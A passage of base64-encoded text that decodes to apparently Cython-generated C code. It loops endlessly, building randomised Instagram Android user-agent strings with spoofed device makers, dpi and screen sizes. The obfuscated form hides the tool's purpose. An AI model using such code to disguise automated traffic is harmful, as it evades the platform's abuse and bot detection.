sLT5fX3B5eF9pbnRfMjUwMDAwMDAwMCk7XG4gICAgICAgIF9fUHl4X1hERUNSRUZfU0VUKF9fcHl4X3ZfYmJrLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjUwMDAwMDAwMCk7XG5cbiAgICAgICAgXG4gICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjEyNTQwMjk4MzQpO1xuICAgICAgICBfX1B5eF9YREVDUkVGX1NFVChfX3B5eF92X0lkbywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIxMjU0MDI5ODM0KTtcblxuICAgICAgICBcbiAgICAgICAgd2hpbGUgKDEpIHtcblxuICAgICAgICAgIFxuICAgICAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZG9tKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDIwLCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JhbmRpbnQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0MjAsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxN10sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA0MjAsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X1VuaWNvZGUoX19weXhfdF80KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNDIwLCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgICAgICBfX1B5eF9YREVDUkVGX1NFVChfX3B5eF92X3JuZCwgKChQeU9iamVjdCopX19weXhfdF81KSk7XG4gICAgICAgICAgX19weXhfdF81ID0gMDtcblxuICAgICAgICAgIFxuICAgICAgICAgIF9fcHl4X3RfNSA9IFB5TGlzdF9OZXcoNik7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDQyMSwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMjNfNl8wKTtcbiAgICAgICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMjNfNl8wKTtcbiAgICAgICAgICBpZiAoX19QeXhfUHlMaXN0X1NFVF9JVEVNKF9fcHl4X3RfNSwgMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8yM182XzApICE9ICgwKSkgX19QWVhfRVJSKDAsIDQyMSwgX19weXhfTDVfZXJyb3IpO1xuICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzI0XzdfMCk7XG4gICAgICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzI0XzdfMCk7XG4gICAgICAgICAgaWYgKF9fUHl4X1B5TGlzdF9TRVRfSVRFTShfX3B5eF90XzUsIDEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMjRfN18wKSAhPSAoMCkpIF9fUFlYX0VSUigwLCA0MjEsIF9fcHl4X0w1X2Vycm9yKTtcbiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8yNV83XzFfMSk7XG4gICAgICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzI1XzdfMV8xKTtcbiAgICAgICAgICBpZiAoX19QeXhfUHlMaXN0X1NFVF9JVEVNKF9fcHl4X3RfNSwgMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8yNV83XzFfMSkgIT0gKDApKSBfX1BZWF9FUlIoMCwgNDIxLCBfX3B5eF9MNV9lcnJvcik7XG4gICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMjZfOF8wKTtcbiAgICAgICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMjZfOF8wKTtcbiAgICAgICAgICBpZiAoX19QeXhfUHlMaXN0X1NFVF9JVEVNKF9fcHl4X3RfNSwgMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8yNl84XzApICE9ICgwKSkgX19QWVhfRVJSKDAsIDQyMSwgX19weXhfTDVfZXJyb3IpO1xuICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzI3XzhfMSk7XG4gICAgICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzI3XzhfMSk7XG4gICAgICAgICAgaWYgKF9fUHl4X1B5TGlzdF9TRVRfSVRFTShfX3B5eF90XzUsIDQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMjdfOF8xKSAhPSAoMCkpIF9fUFlYX0VSUigwLCA0MjEsIF9fcHl4X0w1X2Vycm9yKTtcbiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8yOF85XzApO1xuICAgICAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8yOF85XzApO1xuICAgICAgICAgIGlmIChfX1B5eF9QeUxpc3RfU0VUX0lURU0oX19weXhfdF81LCA1LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzI4XzlfMCkgIT0gKDApKSBfX1BZWF9FUlIoMCwgNDIxLCBfX3B5eF9MNV9lcnJvcik7XG4gICAgICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kb20pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA0MjEsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZGludCk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDQyMSwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzE4XSwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDQyMSwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICAgICAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfR2V0SXRlbShfX3B5eF90XzUsIF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDQyMSwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICAgICAgX19weXhfdF80ID0gUHlOdW1iZXJfQWRkKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfSW5zdGFncmFtXzMxMV8wXzBfMzJfMTE4X0FuZHJvaWQsIF9fcHl4X3RfNik7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDQyMSwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICAgICAgX19weXhfdF82ID0gUHlOdW1iZXJfQWRkKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMjEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCA0MjEsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZG9tKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDIxLCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JhbmRpbnQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0MjEsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxOV0sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA0MjEsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X1VuaWNvZGUoX19weXhfdF80KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNDIxLCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgICAgICBfX3B5eF90XzQgPSBQeU51bWJlcl9BZGQoX19weXhfdF82LCBfX3B5eF90XzUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA0MjEsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgICAgIF9fcHl4X3RfNSA9IFB5TnVtYmVyX0FkZChfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZHBpKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNDIxLCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JhbmRvbSk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDQyMSwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICAgICAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kaW50KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgNDIxLCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMjBdLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDIxLCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgICAgICBfX3B5eF90XzYgPSBfX1B5eF9QeU9iamVjdF9Vbmljb2RlKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDQyMSwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICAgICAgX19weXhfdF80ID0gUHlOdW1iZXJfQWRkKF9fcHl4X3RfNSwgX19weXhfdF82KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDIxLCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgICAgICBfX3B5eF90XzYgPSBQeU51bWJlcl9BZGQoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfeCk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDQyMSwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kb20pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA0MjEsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgICAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZGludCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDQyMSwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzIwXSwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDQyMSwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfVW5pY29kZShfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0MjEsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgICAgIF9fcHl4X3RfNCA9IFB5TnVtYmVyX0FkZChfX3B5eF90XzYsIF9fcHl4X3RfNSk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDQyMSwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG5cbiAgICAgICAgICBcbiAgICAgICAgICBfX3B5eF90XzUgPSBQeU51bWJlcl9BZGQoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X18yMSk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDQyMiwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICAgICAgX19weXhfdF80ID0gUHlMaXN0X05ldygxMik7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDQyMiwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9TQU1TVU5HKTtcbiAgICAgICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9TQU1TVU5HKTtcbiAgICAgICAgICBpZiAoX19QeXhfUHlMaXN0X1NFVF9JVEVNKF9fcHl4X3RfNCwgMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1NBTVNVTkcpICE9ICgwKSkgX19QWVhfRVJSKDAsIDQyMiwgX19weXhfTDVfZXJyb3IpO1xuICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfSFVBV0VJKTtcbiAgICAgICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9IVUFXRUkpO1xuICAgICAgICAgIGlmIChfX1B5eF9QeUxpc3RfU0VUX0lURU0oX19weXhfdF80LCAxLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfSFVBV0VJKSAhPSAoMCkpIF9fUFlYX0VSUigwLCA0MjIsIF9fcHl4X0w1X2Vycm9yKTtcbiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9MR0VfbGdlKTtcbiAgICAgICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfTEdFX2xnZSk7XG4gICAgICAgICAgaWYgKF9fUHl4X1B5TGlzdF9TRVRfSVRFTShfX3B5eF90XzQsIDIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfTEdFX2xnZSkgIT0gKDApKSBfX1BZWF9FUlIoMCwgNDIyLCBfX3B5eF9MNV9lcnJvcik7XG4gICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9IVEMpO1xuICAgICAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0hUQyk7XG4gICAgICAgICAgaWYgKF9fUHl4X1B5TGlzdF9TRVRfSVRFTShfX3B5eF90XzQsIDMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9IVEMpICE9ICgwKSkgX19QWVhfRVJSKDAsIDQyMiwgX19weXhfTDVfZXJyb3IpO1xuICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfQVNVUyk7XG4gICAgICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfQVNVUyk7XG4gICAgICAgICAgaWYgKF9fUHl4X1B5TGlzdF9TRVRfSVRFTShfX3B5eF90XzQsIDQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9BU1VTKSAhPSAoMCkpIF9fUFlYX0VSUigwLCA0MjIsIF9fcHl4X0w1X2Vycm9yKTtcbiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1pURSk7XG4gICAgICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfWlRFKTtcbiAgICAgICAgICBpZiAoX19QeXhfUHlMaXN0X1NFVF9JVEVNKF9fcHl4X3RfNCwgNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1pURSkgIT0gKDApKSBfX1BZWF9FUlIoMCwgNDIyLCBfX3B5eF9MNV9lcnJvcik7XG4gICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9PTkVQTFVTKTtcbiAgICAgICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9PTkVQTFVTKTtcbiAgICAgICAgICBpZiAoX19QeXhfUHlMaXN0X1NFVF9JVEVNKF9fcHl4X3RfNCwgNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X09ORVBMVVMpICE9ICgwKSkgX19QWVhfRVJSKDAsIDQyMiwgX19weXhfTDVfZXJyb3IpO1xuICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfWElBT01JKTtcbiAgICAgICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9YSUFPTUkpO1xuICAgICAgICAgIGlmIChfX1B5eF9QeUxpc3RfU0VUX0lURU0oX19weXhfdF80LCA3LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfWElBT01JKSAhPSAoMCkpIF9fUFlYX0VSUigwLCA0MjIsIF9fcHl4X0w1X2Vycm9yKTtcbiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X09QUE8pO1xuICAgICAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X09QUE8pO1xuICAgICAgICAgIGlmIChfX1B5eF9QeUxpc3RfU0VUX0lURU0oX19weXhfdF80LCA4LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfT1BQTykgIT0gKDApKSBfX1BZWF9FUlIoMCwgNDIyLCBfX3B5eF9MNV9lcnJvcik7XG4gICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9WSVZPKTtcbiAgICAgICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9WSVZPKTtcbiAgICAgICAgICBpZiAoX19QeXhfUHlMaXN0X1NFVF9JVEVNKF9fcHl4X3RfNCwgOSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1ZJVk8pICE9ICgwKSkgX19QWVhfRVJSKDAsIDQyMiwgX19weXhfTDVfZXJyb3IpO1xuICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfU09OWSk7XG4gICAgICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfU09OWSk7XG4gICAgICAgICAgaWYgKF9fUHl4X1B5TGlzdF9TRVRfSVRFTShfX3B5eF90XzQsIDEwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfU09OWSkgIT0gKDApKSBfX1BZWF9FUlIoMCwgNDIyLCBfX3B5eF9MNV9lcnJvcik7XG4gICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9SRUFMTUUpO1xuICAgICAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1JFQUxNRSk7XG4gICAgICAgICAgaWYgKF9fUHl4X1B5TGlzdF9TRVRfSVRFTShfX3B5eF90XzQsIDExLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfUkVBTE1FKSAhPSAoMCkpIF9fUFlYX0VSUigwLCA0MjIsIF9fcHl4X0w1X2Vycm9yKTtcbiAgICAgICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JhbmRvbSk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDQyMiwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICAgICAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kaW50KTsgaWYgKH